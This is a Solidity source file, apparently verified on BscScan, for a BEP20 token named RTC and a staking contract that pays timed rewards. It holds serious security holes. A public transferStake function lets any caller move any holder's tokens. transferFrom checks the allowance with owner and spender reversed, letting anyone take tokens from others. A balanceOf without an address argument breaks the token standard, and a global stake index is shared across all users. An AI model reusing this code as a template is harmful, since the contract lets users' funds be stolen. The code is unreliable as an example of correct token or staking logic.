/**
 *Submitted for verification at BscScan.com on 2022-02-16
*/

// SPDX-License-Identifier: MIT
// File: BEP20/Context.sol

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}


// File: BEP20/IBEP20.sol


pragma solidity ^0.8.0;

interface IBEP20 {
  
    function totalSupply() external view returns (uint256);



    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// File: BEP20/IBEP20Metadata.sol


pragma solidity ^0.8.0;


interface IBEP20Metadata is IBEP20 {
   
    function name() external view returns (string memory);

   
    function symbol() external view returns (string memory);

   
    function decimals() external view returns (uint8);

 

}

// File: BEP20/BEP20.sol


pragma solidity ^0.8.0;




contract BEP20 is Context, IBEP20, IBEP20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 public _totalSupply;
constructor (uint tokenSupply){
   _mint(msg.sender , tokenSupply   );
    
}
    function name() public view virtual override returns (string memory) {
        return "RTC";
    }

    function symbol() public view virtual override returns (string memory) {
        return "rtc";
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
   
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf() public view virtual  returns (uint256) {
        return _balances[msg.sender];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender,address recipient, uint256 amount ) public   virtual override returns (bool) {
        _transfer(sender, recipient, amount);
 
         require(_allowances[msg.sender][sender] >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(msg.sender,sender , _allowances[msg.sender][sender] - amount);
        }

        return true;
    } 

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

            _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
          }
            _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

            _afterTokenTransfer(sender, recipient, amount);
    }

  

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

            _totalSupply += amount;
            _balances[account] += amount;
        emit Transfer(address(0), account, amount);

            _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

            _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
            _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

            _afterTokenTransfer(account, address(0), amount);
    }

    function _approve( address owner,address spender,uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

            _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer( address from,address to,uint256 amount) internal virtual {}

    function _afterTokenTransfer( address from, address to,  uint256 amount) internal virtual {}
}

// File: RTC.sol



pragma solidity ^0.8.0;


 contract RTC  is BEP20{
  
    constructor () BEP20(1000000000 * 10**18){

}
 
function transferStake(address sender , address reciver , uint amount) public virtual  returns (bool){
        _transfer(sender ,  reciver , amount);
        return true;
    }
    }
// File: afterstake.sol


pragma solidity ^0.8.0;

contract STAKING is RTC {
    RTC public stakingToken;
    uint256 interestPerSecond;
    uint256 totalRewardTime;
    uint256 rewardGeneratedTime;
    uint256 stakedAmount;
    uint256 secInMonth = 60;
    uint256 rewardGeneratedFor;
    uint256 stakePerWEEK;
    uint256 weekOfClaim;
    uint256 timeAfterStakeFinish;
    uint256 totalAmountGenerated;
    uint256 index = 0;
    mapping(address => mapping(uint256 => uint256)) _stakeMonth;
    mapping(address => mapping(uint256 => uint256)) _stakedMoney;
    mapping(address => mapping(uint256 => uint256))  totalClaim;
    mapping(address => mapping(uint256 => uint256)) TotalReward;
    mapping(address => mapping(uint256 => uint256)) claimableReward;
    mapping(address => mapping(uint256 => uint256)) staketime;
    mapping(address => mapping(uint256 => uint256)) coolingTime;
    constructor(address _stakingToken) {
        stakingToken = RTC(_stakingToken);
    }

    function indexid(uint256 _index) public {
         require(stakedAmount > 0, "  stake some amonut");
        index = _index;
        _stakedMoney[msg.sender][index];
        emit indexID(index, _stakedMoney[msg.sender][_index] , _stakeMonth[msg.sender][index]);
    }

    function stake( uint256 amount, uint256 months, uint256 interest ) public { 
        require((interest == 3 && months == 1) ||
                (interest == 4 && months == 2) ||
                (interest == 5 && months == 3) ||
                (interest == 6 && months == 6), "Invalid Input" );
        require(amount > 100, "minimum stake is 100");
        index = index + 1;
        stakedAmount += amount;
        _stakeMonth[msg.sender][index] = months;
        staketime[msg.sender][index] = block.timestamp;
        coolingTime[msg.sender][index] = staketime[msg.sender][index] + _stakeMonth[msg.sender][index] * secInMonth;
        _stakedMoney[msg.sender][index] = amount;
        RTC.transferStake(msg.sender, address(this), amount);
    TotalReward[msg.sender][index] = (((interest * _stakedMoney[msg.sender][index]) *_stakeMonth[msg.sender][index]) / 100);
        emit staked(
            index,
            _stakedMoney[msg.sender][index],
            staketime[msg.sender][index],
            _stakeMonth[msg.sender][index],
            TotalReward[msg.sender][index]
        );
    }

    function rewardGen() public {
        require(stakedAmount > 0, "  stake some amonut");
          require(TotalReward[msg.sender][index] !=0, "all reward claimed" );
            interestPerSecond =  TotalReward[msg.sender][index] / (_stakeMonth[msg.sender][index] * secInMonth);
            totalRewardTime = TotalReward[msg.sender][index] /  interestPerSecond;
        if (coolingTime[msg.sender][index] > block.timestamp) {
            uint RewardTime = block.timestamp - staketime[msg.sender][index];
            claimableReward[msg.sender][index] = RewardTime * interestPerSecond;  
            claimableReward[msg.sender][index] = claimableReward[msg.sender][index] - totalClaim[msg.sender][index];
            rewardGeneratedFor = claimableReward[msg.sender][index] / interestPerSecond;  
        } else {
            claimableReward[msg.sender][index] =  TotalReward[msg.sender][index] - totalClaim[msg.sender][index];
    rewardGeneratedFor = _stakeMonth[msg.sender][index] * secInMonth -  totalClaim[msg.sender][index]/interestPerSecond;                     
        }
         emit RewardGen(
                index,
                interestPerSecond,
                totalRewardTime,
                claimableReward[msg.sender][index],
                rewardGeneratedFor
            ); 
    }

    function claimReward() public {
          require(TotalReward[msg.sender][index] !=0, "all reward claimed" );
            require(  claimableReward[msg.sender][index] > 0, " generate reward first");
            require(stakedAmount > 0, "  stake some amonut");
        if (coolingTime[msg.sender][index] > block.timestamp) {
            totalClaim[msg.sender][index] = claimableReward[msg.sender][index] + totalClaim[msg.sender][index];
             } else {    
            claimableReward[msg.sender][index] = TotalReward[msg.sender][index] - totalClaim[msg.sender][index];
            totalClaim[msg.sender][index] = claimableReward[msg.sender][index] + totalClaim[msg.sender][index];
             TotalReward[msg.sender][index] -= totalClaim[msg.sender][index];
             totalClaim[msg.sender][index] -= totalClaim[msg.sender][index];
        }
        _mint(msg.sender, claimableReward[msg.sender][index]);
         claimableReward[msg.sender][index] -= claimableReward[msg.sender][ index];
    }

    function matureAmount() public {  
        require(stakedAmount > 0, " must stake some amount");
        require( coolingTime[msg.sender][index] <= block.timestamp, "Can only generate after cooling Time");
        require( totalClaim[msg.sender][index] >= TotalReward[msg.sender][index], "  first claim all reward" );
        require( totalClaim[msg.sender][index] + 20 <= _stakedMoney[msg.sender][index], "cant claim more than satked amount");
        stakePerWEEK = _stakedMoney[msg.sender][index] / 20;
        timeAfterStakeFinish = block.timestamp - coolingTime[msg.sender][index];
        weekOfClaim = timeAfterStakeFinish / 20;
        totalAmountGenerated = weekOfClaim * stakePerWEEK;
        if (coolingTime[msg.sender][index] + 400 > block.timestamp) {
            claimableReward[msg.sender][index] =
                totalAmountGenerated -
                totalClaim[msg.sender][index]; 
        } else {
             claimableReward[msg.sender][index]=
                _stakedMoney[msg.sender][index] -
                totalClaim[msg.sender][index];
        }
        emit Withdrawl(
            index,
            stakePerWEEK,
            weekOfClaim,
              claimableReward[msg.sender][index],
            totalAmountGenerated,
              _stakedMoney[msg.sender][index]
        );}

    function claimPrinciple() public { 
        require( totalClaim[msg.sender][index] <= _stakedMoney[msg.sender][index],
                  "cant claim more than staked amount");
         require(stakedAmount > 0, " must stake some amount");
        require( coolingTime[msg.sender][index] + 20 <= block.timestamp, "Can only generate after cooling Time");
        require(claimableReward[msg.sender][index] > 0, "cant claim before mature amount");
        require(stakePerWEEK <= claimableReward[msg.sender][index], "claim only after 20 seconds");
       
        if (coolingTime[msg.sender][index] + 400 > block.timestamp) {
            totalClaim[msg.sender][index] = claimableReward[msg.sender][index] + totalClaim[msg.sender][index];
            RTC.transferStake(address(this), msg.sender,  claimableReward[msg.sender][index]);
             emit Transfer(address(this), msg.sender,  claimableReward[msg.sender][index]);
        } else {
            claimableReward[msg.sender][index] = _stakedMoney[msg.sender][index] - totalClaim[msg.sender][index];
            RTC.transferStake(address(this), msg.sender, claimableReward[msg.sender][index]);
            totalClaim[msg.sender][index] = claimableReward[msg.sender][index] + totalClaim[msg.sender][index];
             emit Transfer(address(this), msg.sender,  claimableReward[msg.sender][index]);
        }
          stakedAmount -=  claimableReward[msg.sender][index];
         claimableReward[msg.sender][index] -=  claimableReward[msg.sender][index];
    }

    function ClaimAvailable() public view returns (uint256) {
        return totalClaim[msg.sender][index];
    }
     function TotalRewardGEnerated() public view returns (uint256) {
        return TotalReward[msg.sender][index];
    }

    function claimableRreward() public view returns (uint256) {
        return claimableReward[msg.sender][index];
    }

    function totalSupply() public view virtual override returns (uint256) {
        return stakedAmount;
    }
 function getApplicationByBATCHID(uint256 _index) public view returns (
            uint256 stakedtime,
            uint256 stakedmoney,
            uint256 stakeMonth,
            uint256 totalRewardGenerated,
            uint256 Coolingtime
        )
    {return (
            staketime[msg.sender][_index],
            _stakedMoney[msg.sender][_index],
            _stakeMonth[msg.sender][_index],
            TotalReward[msg.sender][_index],
            coolingTime[msg.sender][_index]);
            }

    event staked(
        uint256 id,
        uint256 stakedAmount,
        uint256 StakeTime,
        uint256 _stakeMonth,
        uint256 totalRewardGeneratead);
    event indexID(uint256 indexID, uint256 stakedMoneyONID ,uint256 stakedMonthOfID );
    event RewardGen(
         uint256 id,
        uint256 interestPerSecond,
        uint256 rewardGeneratedPeriod,
        uint256 RewardGeneratedAmount,
        uint256 rewardGeneratedFor);
    event Withdrawl(
         uint256 id,
        uint256 stakePerWEEK,
        uint256 totalWeekOfWithdrawlGenerated,
        uint256 rewardAvailable,
        uint256 totalAmountGenerated,
        uint256 stakedAmount);  
}